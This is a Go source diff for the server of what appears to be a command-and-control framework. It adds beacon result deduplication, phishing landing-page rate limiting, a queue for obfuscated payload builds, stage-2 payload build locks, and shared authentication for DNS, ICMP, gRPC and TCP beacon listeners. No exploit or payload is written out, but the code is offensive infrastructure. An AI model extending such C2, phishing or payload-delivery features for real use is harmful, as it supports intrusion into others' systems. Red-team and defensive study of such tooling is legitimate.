@@ -74,6 +74,9 @@ type Server struct {
 	wsHub     *WebSocketHub
 	wsHubOnce sync.Once
 
+	// Operator WebSocket sessions (real-time updates)
+	operatorSessions *operatorSessionTracker
+
 	// Event system
 	eventManager *EventManager
 
@@ -130,6 +133,17 @@ type Server struct {
 	beaconDedupMu    sync.Mutex
 	beaconDedupCache map[string]time.Time
 
+	// Task result idempotency: agentID + result id → processed timestamp.
+	// Results re-sent after a dropped frame carry a new envelope seq, so
+	// dedupe on the agent-supplied result id instead.
+	resultDedupeMu    sync.Mutex
+	resultDedupeCache map[string]time.Time
+
+	// Phishing landing page rate limiting keyed by token+IP
+	landingLimiterMu    sync.Mutex
+	landingLimiterHits  map[string]int
+	landingLimiterSince map[string]time.Time
+
 	// External C2 channels (WebSocket relay, Discord, Slack)
 	extC2Channels   map[string]*extC2WSChannel
 	extC2ChannelsMu sync.Mutex
@@ -140,6 +154,17 @@ type Server struct {
 	// Async build job tracking
 	buildJobs   map[string]*BuildJob
 	buildJobsMu sync.RWMutex
+
+	// Serialized build execution queue: heavy go/garble toolchain invocations
+	// are queued through a single worker so concurrent generate requests cannot
+	// exhaust CPU/disk. Lazily initialized on first submit.
+	buildQueue     chan *queuedBuild
+	buildQueueOnce sync.Once
+
+	// Serializes lazy /stage stage-2 payload builds per token so concurrent
+	// fetches for the same token do not trigger redundant toolchain builds.
+	stageBuildLocks   map[string]*sync.Mutex
+	stageBuildLocksMu sync.Mutex
 
 	// Embedded frontend static files (nil = API-only mode)
 	staticFS fs.FS
@@ -261,10 +286,13 @@ func New(cfg *config.Config, database *gorm.DB) *Server {
 		rportfwdListeners:     make(map[string]*rportfwdRelay),
 		trafficLog:            newTrafficRing(),
 		eventManager:          NewEventManager(database),
+		operatorSessions:      &operatorSessionTracker{sessions: make(map[uint]*WSOperatorSession)},
 		extraListeners:        make(map[string]io.Closer),
 		domainFrontStatus:     make(map[string]*frontDomainState),
 		agentPendingTasks:     make(map[string]int),
 		beaconDedupCache:      make(map[string]time.Time),
+		landingLimiterHits:    make(map[string]int),
+		landingLimiterSince:   make(map[string]time.Time),
 		agentStatusCooldown:   make(map[string]time.Time),
 		ntlmRelays:            newNTLMRelayStore(),
 		extC2Channels:         make(map[string]*extC2WSChannel),
@@ -348,22 +376,12 @@ func New(cfg *config.Config, database *gorm.DB) *Server {
 
 	// Beacon payload encryption via ECDH session (cfg.Crypto.Key = "ecdh:")
 	if strings.HasPrefix(cfg.Crypto.Key, "ecdh:") {
-		maxMsgs := cfg.Crypto.SessionMaxMessages
-		maxAgeMin := cfg.Crypto.SessionMaxAgeMinutes
-		var maxAge time.Duration
-		if maxAgeMin > 0 {
-			maxAge = time.Duration(maxAgeMin) * time.Minute
-		} else {
-			maxAge = crypto.DefaultSessionMaxAge
-		}
-		sm, err := crypto.NewSessionManagerWithConfig(maxMsgs, maxAge)
+		sm, err := crypto.NewSessionManager()
 		if err != nil {
 			slog.Error("Failed to initialize ECDH session manager, falling back to XOR", "err", err)
 		} else {
 			s.sessionManager = sm
-			slog.Info("ECDH session encryption enabled",
-				"max_messages", sm.MaxMessages(),
-				"max_age", sm.MaxAge())
+			slog.Info("ECDH session encryption enabled")
 		}
 	}
 
@@ -495,7 +513,7 @@ func (s *Server) InitOptimizations(configPath string) {
 			case "crypto.key", "server.jwt_secret":
 				crypto.InitLootEncryption(s.cfg.Server.JWTSecret, s.cfg.Crypto.LootKey)
 				crypto.InitExtC2Encryption(s.cfg.Server.JWTSecret)
-				slog.Info("Crypto primitives re-initialized after config change (existing ECDH sessions invalidated)", "field", field)
+				slog.Info("Crypto primitives re-derived from updated config", "field", field, "loot_key_explicit", s.cfg.Crypto.LootKey != "")
 			}
 		}
 
@@ -637,8 +655,6 @@ func (s *Server) SetupRoutes() {
 	s.registerMiscRoutes(auth)
 }
 
-
-
 // handleWebSocket handles WebSocket connections for real-time notifications
 // Auth is validated inside the handler (from cookie or query token) so this
 // endpoint does NOT need to be behind the AuthRequired middleware.
@@ -746,9 +762,26 @@ func (s *Server) handleWebSocket(c *gin.Context) {
 
 		for {
 			conn.SetReadDeadline(time.Now().Add(WSReadDeadline))
-			_, _, err := conn.ReadMessage()
+			_, data, err := conn.ReadMessage()
 			if err != nil {
 				return
+			}
+			// Answer application-level heartbeats. The frontend tracks liveness
+			// with {type:"ping"}/{type:"pong"} application messages; without a
+			// pong it closes the socket every HEARTBEAT_TIMEOUT and reconnects.
+			// Route the reply through the writer goroutine: gorilla/websocket
+			// allows only one concurrent writer, and the reader goroutine must
+			// never WriteMessage on the same conn.
+			var msg struct {
+				Type string `json:"type"`
+			}
+			if len(data) > 0 && data[0] == '{' && json.Unmarshal(data, &msg) == nil && msg.Type == "ping" {
+				select {
+				case client.ch <- []byte(`{"type":"pong"}`):
+				default:
+					// Writer queue full — drop the pong rather than block the
+					// read loop; the frontend will reconnect on heartbeat timeout.
+				}
 			}
 		}
 	}()
@@ -1483,24 +1516,55 @@ func (s *Server) startExtraListenersFromDB() {
 }
 
 // makeBeaconHandler creates a closure that wraps processBeacon for listener callbacks.
+// It enforces the same beacon_key auth and ECDH envelope semantics as the HTTP
+// beacon handler, so no listener transport (DNS, ICMP, gRPC, TCP) can bypass
+// authentication or downgrade to plaintext when ECDH is forced.
 func (s *Server) makeBeaconHandler() func(string, []byte) []byte {
-	return func(agentID string, reqJSON []byte) []byte {
-		var req beaconRequest
-		if len(reqJSON) > 0 {
-			if err := json.Unmarshal(reqJSON, &req); err != nil {
-				slog.Error("Beacon handler unmarshal error", "err", err)
-			}
+	return s.handleListenerBeacon
+}
+
+// handleListenerBeacon processes a beacon envelope received over a non-HTTP
+// listener. It decodes/authenticates the envelope the same way as the HTTP
+// handler (protocol v2: timestamp window, seq replay window, ECDH/AES-256-GCM
+// ciphertext, authenticated handshake/registration frames) and builds the
+// response with matching encryption semantics.
+func (s *Server) handleListenerBeacon(agentID string, reqJSON []byte) []byte {
+	raw := reqJSON
+	if len(raw) == 0 {
+		// No embedded payload: minimal envelope with just the UUID
+		env, err := json.Marshal(map[string]string{"uuid": agentID})
+		if err != nil {
+			return nil
 		}
-		if req.UUID == "" {
-			req.UUID = agentID
-		}
+		raw = env
+	}
+
+	env, req, kind := s.decodeBeaconEnvelope(raw)
+	if kind == frameRejected {
+		return nil
+	}
+	if req.UUID == "" {
+		req.UUID = agentID
+	}
+	var respJSON []byte
+	if kind == frameEncrypted {
 		resp := s.processBeacon(req, "")
-		respJSON, ok := marshalJSONSafe(resp)
+		if s.sessionManager.NeedsRekey(req.UUID, BeaconSessionRekeyMessages) {
+			resp.Rekey = true
+		}
+		var ok bool
+		respJSON, ok = s.buildBeaconResponse(req.UUID, env.Seq, resp)
 		if !ok {
 			return nil
 		}
-		return respJSON
+	} else {
+		var ok bool
+		respJSON, ok = s.processAuthFrame(env, kind)
+		if !ok {
+			return nil
+		}
 	}
+	return respJSON
 }
 
 // startExtraListener starts an additional listener for the given scheme and key.
@@ -1864,18 +1928,30 @@ func (s *Server) handleTCPConnection(conn net.Conn) {
 			return
 		}
 
-		envelope, req, useECDH, ok := s.decodeBeaconEnvelope(buf, "")
-		if !ok {
+		env, req, kind := s.decodeBeaconEnvelope(buf)
+		if kind == frameRejected {
 			return
 		}
 
-		resp := s.processBeacon(req, "")
-
-		// Wrap the response in the same transport envelope as HTTP so the
-		// agent-side ECDH handshake/decryption logic works over TCP too.
-		respBytes, ok := s.buildBeaconResponse(req, resp, useECDH, envelope.ECDHPub != "" && !useECDH)
-		if !ok {
-			return
+		var respBytes []byte
+		if kind == frameEncrypted {
+			resp := s.processBeacon(req, "")
+			if s.sessionManager.NeedsRekey(req.UUID, BeaconSessionRekeyMessages) {
+				resp.Rekey = true
+			}
+			var ok bool
+			// Wrap the response in the same transport envelope as HTTP so the
+			// agent-side ECDH handshake/decryption logic works over TCP too.
+			respBytes, ok = s.buildBeaconResponse(req.UUID, env.Seq, resp)
+			if !ok {
+				return
+			}
+		} else {
+			var ok bool
+			respBytes, ok = s.processAuthFrame(env, kind)
+			if !ok {
+				return
+			}
 		}
 
 		if err := binary.Write(conn, binary.BigEndian, uint32(len(respBytes))); err != nil {
